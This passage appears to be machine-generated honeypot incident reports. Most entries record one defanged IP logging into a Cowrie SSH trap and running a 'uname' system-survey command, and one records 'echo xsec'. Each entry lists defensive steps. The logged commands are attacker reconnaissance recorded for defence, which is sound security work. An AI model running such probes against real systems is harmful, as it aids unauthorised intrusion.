| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:51 |
| **Last Seen** | 2026-08-15 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:51:10` | `cowrie.session.connect` |
| `2026-08-15 06:51:10` | `cowrie.client.version` |
| `2026-08-15 06:51:11` | `cowrie.client.kex` |
| `2026-08-15 06:51:11` | `cowrie.login.success` |
| `2026-08-15 06:51:12` | `cowrie.session.params` |
| `2026-08-15 06:51:12` | `cowrie.command.input` |
| `2026-08-15 06:51:12` | `cowrie.log.closed` |
| `2026-08-15 06:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abe28a467a38

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:51 |
| **Last Seen** | 2026-08-15 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:51:16` | `cowrie.session.connect` |
| `2026-08-15 06:51:16` | `cowrie.client.version` |
| `2026-08-15 06:51:16` | `cowrie.client.kex` |
| `2026-08-15 06:51:17` | `cowrie.login.success` |
| `2026-08-15 06:51:18` | `cowrie.session.params` |
| `2026-08-15 06:51:18` | `cowrie.command.input` |
| `2026-08-15 06:51:18` | `cowrie.log.closed` |
| `2026-08-15 06:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d9ad3ffea6b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:51 |
| **Last Seen** | 2026-08-15 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:51:22` | `cowrie.session.connect` |
| `2026-08-15 06:51:22` | `cowrie.client.version` |
| `2026-08-15 06:51:22` | `cowrie.client.kex` |
| `2026-08-15 06:51:23` | `cowrie.login.success` |
| `2026-08-15 06:51:24` | `cowrie.session.params` |
| `2026-08-15 06:51:24` | `cowrie.command.input` |
| `2026-08-15 06:51:24` | `cowrie.log.closed` |
| `2026-08-15 06:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aee89c184e2b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:51 |
| **Last Seen** | 2026-08-15 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:51:27` | `cowrie.session.connect` |
| `2026-08-15 06:51:28` | `cowrie.client.version` |
| `2026-08-15 06:51:28` | `cowrie.client.kex` |
| `2026-08-15 06:51:28` | `cowrie.login.success` |
| `2026-08-15 06:51:29` | `cowrie.session.params` |
| `2026-08-15 06:51:29` | `cowrie.command.input` |
| `2026-08-15 06:51:29` | `cowrie.log.closed` |
| `2026-08-15 06:51:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fd2cbf7696a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:51 |
| **Last Seen** | 2026-08-15 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:51:33` | `cowrie.session.connect` |
| `2026-08-15 06:51:33` | `cowrie.client.version` |
| `2026-08-15 06:51:33` | `cowrie.client.kex` |
| `2026-08-15 06:51:34` | `cowrie.login.success` |
| `2026-08-15 06:51:35` | `cowrie.session.params` |
| `2026-08-15 06:51:35` | `cowrie.command.input` |
| `2026-08-15 06:51:36` | `cowrie.log.closed` |
| `2026-08-15 06:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83e6f70cb332

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:51 |
| **Last Seen** | 2026-08-15 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:51:39` | `cowrie.session.connect` |
| `2026-08-15 06:51:39` | `cowrie.client.version` |
| `2026-08-15 06:51:39` | `cowrie.client.kex` |
| `2026-08-15 06:51:39` | `cowrie.login.success` |
| `2026-08-15 06:51:40` | `cowrie.session.params` |
| `2026-08-15 06:51:40` | `cowrie.command.input` |
| `2026-08-15 06:51:40` | `cowrie.log.closed` |
| `2026-08-15 06:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a071ac2a1adf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:51 |
| **Last Seen** | 2026-08-15 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:51:45` | `cowrie.session.connect` |
| `2026-08-15 06:51:45` | `cowrie.client.version` |
| `2026-08-15 06:51:45` | `cowrie.client.kex` |
| `2026-08-15 06:51:46` | `cowrie.login.success` |
| `2026-08-15 06:51:47` | `cowrie.session.params` |
| `2026-08-15 06:51:47` | `cowrie.command.input` |
| `2026-08-15 06:51:47` | `cowrie.log.closed` |
| `2026-08-15 06:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b11a1b78384

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:51 |
| **Last Seen** | 2026-08-15 06:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:51:51` | `cowrie.session.connect` |
| `2026-08-15 06:51:51` | `cowrie.client.version` |
| `2026-08-15 06:51:51` | `cowrie.client.kex` |
| `2026-08-15 06:51:52` | `cowrie.login.success` |
| `2026-08-15 06:51:53` | `cowrie.session.params` |
| `2026-08-15 06:51:53` | `cowrie.command.input` |
| `2026-08-15 06:51:53` | `cowrie.log.closed` |
| `2026-08-15 06:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f072512b8b11

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:51 |
| **Last Seen** | 2026-08-15 06:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:51:56` | `cowrie.session.connect` |
| `2026-08-15 06:51:57` | `cowrie.client.version` |
| `2026-08-15 06:51:57` | `cowrie.client.kex` |
| `2026-08-15 06:51:57` | `cowrie.login.success` |
| `2026-08-15 06:51:58` | `cowrie.session.params` |
| `2026-08-15 06:51:58` | `cowrie.command.input` |
| `2026-08-15 06:51:58` | `cowrie.log.closed` |
| `2026-08-15 06:51:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4b6528228b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:52 |
| **Last Seen** | 2026-08-15 06:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:52:02` | `cowrie.session.connect` |
| `2026-08-15 06:52:02` | `cowrie.client.version` |
| `2026-08-15 06:52:02` | `cowrie.client.kex` |
| `2026-08-15 06:52:03` | `cowrie.login.success` |
| `2026-08-15 06:52:04` | `cowrie.session.params` |
| `2026-08-15 06:52:04` | `cowrie.command.input` |
| `2026-08-15 06:52:04` | `cowrie.log.closed` |
| `2026-08-15 06:52:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f7ed05ac339

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:52 |
| **Last Seen** | 2026-08-15 06:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:52:08` | `cowrie.session.connect` |
| `2026-08-15 06:52:08` | `cowrie.client.version` |
| `2026-08-15 06:52:08` | `cowrie.client.kex` |
| `2026-08-15 06:52:09` | `cowrie.login.success` |
| `2026-08-15 06:52:10` | `cowrie.session.params` |
| `2026-08-15 06:52:10` | `cowrie.command.input` |
| `2026-08-15 06:52:10` | `cowrie.log.closed` |
| `2026-08-15 06:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6790e7d5365

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:52 |
| **Last Seen** | 2026-08-15 06:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:52:15` | `cowrie.session.connect` |
| `2026-08-15 06:52:15` | `cowrie.client.version` |
| `2026-08-15 06:52:15` | `cowrie.client.kex` |
| `2026-08-15 06:52:16` | `cowrie.login.success` |
| `2026-08-15 06:52:17` | `cowrie.session.params` |
| `2026-08-15 06:52:17` | `cowrie.command.input` |
| `2026-08-15 06:52:18` | `cowrie.log.closed` |
| `2026-08-15 06:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c695f383c0ee

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:52 |
| **Last Seen** | 2026-08-15 06:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:52:22` | `cowrie.session.connect` |
| `2026-08-15 06:52:22` | `cowrie.client.version` |
| `2026-08-15 06:52:22` | `cowrie.client.kex` |
| `2026-08-15 06:52:23` | `cowrie.login.success` |
| `2026-08-15 06:52:24` | `cowrie.session.params` |
| `2026-08-15 06:52:24` | `cowrie.command.input` |
| `2026-08-15 06:52:24` | `cowrie.log.closed` |
| `2026-08-15 06:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d5627b2f9b8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:52 |
| **Last Seen** | 2026-08-15 06:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:52:27` | `cowrie.session.connect` |
| `2026-08-15 06:52:28` | `cowrie.client.version` |
| `2026-08-15 06:52:28` | `cowrie.client.kex` |
| `2026-08-15 06:52:29` | `cowrie.login.success` |
| `2026-08-15 06:52:30` | `cowrie.session.params` |
| `2026-08-15 06:52:30` | `cowrie.command.input` |
| `2026-08-15 06:52:31` | `cowrie.log.closed` |
| `2026-08-15 06:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bac76838da14

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:52 |
| **Last Seen** | 2026-08-15 06:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:52:33` | `cowrie.session.connect` |
| `2026-08-15 06:52:33` | `cowrie.client.version` |
| `2026-08-15 06:52:33` | `cowrie.client.kex` |
| `2026-08-15 06:52:35` | `cowrie.login.success` |
| `2026-08-15 06:52:36` | `cowrie.session.params` |
| `2026-08-15 06:52:36` | `cowrie.command.input` |
| `2026-08-15 06:52:37` | `cowrie.log.closed` |
| `2026-08-15 06:52:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55defdd27571

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:52 |
| **Last Seen** | 2026-08-15 06:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:52:39` | `cowrie.session.connect` |
| `2026-08-15 06:52:39` | `cowrie.client.version` |
| `2026-08-15 06:52:39` | `cowrie.client.kex` |
| `2026-08-15 06:52:40` | `cowrie.login.success` |
| `2026-08-15 06:52:41` | `cowrie.session.params` |
| `2026-08-15 06:52:41` | `cowrie.command.input` |
| `2026-08-15 06:52:42` | `cowrie.log.closed` |
| `2026-08-15 06:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95c7ca11f6b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:52 |
| **Last Seen** | 2026-08-15 06:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:52:45` | `cowrie.session.connect` |
| `2026-08-15 06:52:45` | `cowrie.client.version` |
| `2026-08-15 06:52:45` | `cowrie.client.kex` |
| `2026-08-15 06:52:47` | `cowrie.login.success` |
| `2026-08-15 06:52:48` | `cowrie.session.params` |
| `2026-08-15 06:52:48` | `cowrie.command.input` |
| `2026-08-15 06:52:48` | `cowrie.log.closed` |
| `2026-08-15 06:52:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc6cf8a89fad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:52 |
| **Last Seen** | 2026-08-15 06:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:52:52` | `cowrie.session.connect` |
| `2026-08-15 06:52:52` | `cowrie.client.version` |
| `2026-08-15 06:52:52` | `cowrie.client.kex` |
| `2026-08-15 06:52:53` | `cowrie.login.success` |
| `2026-08-15 06:52:54` | `cowrie.session.params` |
| `2026-08-15 06:52:54` | `cowrie.command.input` |
| `2026-08-15 06:52:54` | `cowrie.log.closed` |
| `2026-08-15 06:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4c3be14c4e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:52 |
| **Last Seen** | 2026-08-15 06:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:52:58` | `cowrie.session.connect` |
| `2026-08-15 06:52:58` | `cowrie.client.version` |
| `2026-08-15 06:52:58` | `cowrie.client.kex` |
| `2026-08-15 06:52:59` | `cowrie.login.success` |
| `2026-08-15 06:53:00` | `cowrie.session.params` |
| `2026-08-15 06:53:00` | `cowrie.command.input` |
| `2026-08-15 06:53:00` | `cowrie.log.closed` |
| `2026-08-15 06:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1770051e1e02

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:53 |
| **Last Seen** | 2026-08-15 06:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:53:04` | `cowrie.session.connect` |
| `2026-08-15 06:53:04` | `cowrie.client.version` |
| `2026-08-15 06:53:04` | `cowrie.client.kex` |
| `2026-08-15 06:53:05` | `cowrie.login.success` |
| `2026-08-15 06:53:06` | `cowrie.session.params` |
| `2026-08-15 06:53:06` | `cowrie.command.input` |
| `2026-08-15 06:53:06` | `cowrie.log.closed` |
| `2026-08-15 06:53:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b21f36738f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:53 |
| **Last Seen** | 2026-08-15 06:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:53:10` | `cowrie.session.connect` |
| `2026-08-15 06:53:10` | `cowrie.client.version` |
| `2026-08-15 06:53:10` | `cowrie.client.kex` |
| `2026-08-15 06:53:11` | `cowrie.login.success` |
| `2026-08-15 06:53:12` | `cowrie.session.params` |
| `2026-08-15 06:53:12` | `cowrie.command.input` |
| `2026-08-15 06:53:12` | `cowrie.log.closed` |
| `2026-08-15 06:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c00531f08b02

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:53 |
| **Last Seen** | 2026-08-15 06:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:53:17` | `cowrie.session.connect` |
| `2026-08-15 06:53:17` | `cowrie.client.version` |
| `2026-08-15 06:53:17` | `cowrie.client.kex` |
| `2026-08-15 06:53:18` | `cowrie.login.success` |
| `2026-08-15 06:53:19` | `cowrie.session.params` |
| `2026-08-15 06:53:19` | `cowrie.command.input` |
| `2026-08-15 06:53:19` | `cowrie.log.closed` |
| `2026-08-15 06:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ddbaac120ac

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 06:53 |
| **Last Seen** | 2026-08-15 06:54 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:53:18` | `cowrie.session.connect` |
| `2026-08-15 06:53:23` | `cowrie.client.version` |
| `2026-08-15 06:53:23` | `cowrie.client.kex` |
| `2026-08-15 06:53:46` | `cowrie.login.success` |
| `2026-08-15 06:53:58` | `cowrie.session.params` |
| `2026-08-15 06:53:58` | `cowrie.command.input` |
| `2026-08-15 06:54:03` | `cowrie.log.closed` |
| `2026-08-15 06:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e45e31d15660

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:53 |
| **Last Seen** | 2026-08-15 06:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:53:24` | `cowrie.session.connect` |
| `2026-08-15 06:53:24` | `cowrie.client.version` |
| `2026-08-15 06:53:24` | `cowrie.client.kex` |
| `2026-08-15 06:53:25` | `cowrie.login.success` |
| `2026-08-15 06:53:26` | `cowrie.session.params` |
| `2026-08-15 06:53:26` | `cowrie.command.input` |
| `2026-08-15 06:53:26` | `cowrie.log.closed` |
| `2026-08-15 06:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a987bd177d5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:53 |
| **Last Seen** | 2026-08-15 06:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:53:31` | `cowrie.session.connect` |
| `2026-08-15 06:53:31` | `cowrie.client.version` |
| `2026-08-15 06:53:31` | `cowrie.client.kex` |
| `2026-08-15 06:53:32` | `cowrie.login.success` |
| `2026-08-15 06:53:33` | `cowrie.session.params` |
| `2026-08-15 06:53:33` | `cowrie.command.input` |
| `2026-08-15 06:53:33` | `cowrie.log.closed` |
| `2026-08-15 06:53:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]7` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2226bf89e52f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]7` |
| **First Seen** | 2026-08-15 06:53 |
| **Last Seen** | 2026-08-15 06:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:53:37` | `cowrie.session.connect` |
| `2026-08-15 06:53:37` | `cowrie.client.version` |
| `2026-08-15 06:53:37` | `cowrie.client.kex` |
| `2026-08-15 06:53:39` | `cowrie.login.success` |
| `2026-08-15 06:53:40` | `cowrie.session.params` |
| `2026-08-15 06:53:40` | `cowrie.command.input` |
| `2026-08-15 06:53:40` | `cowrie.log.closed` |
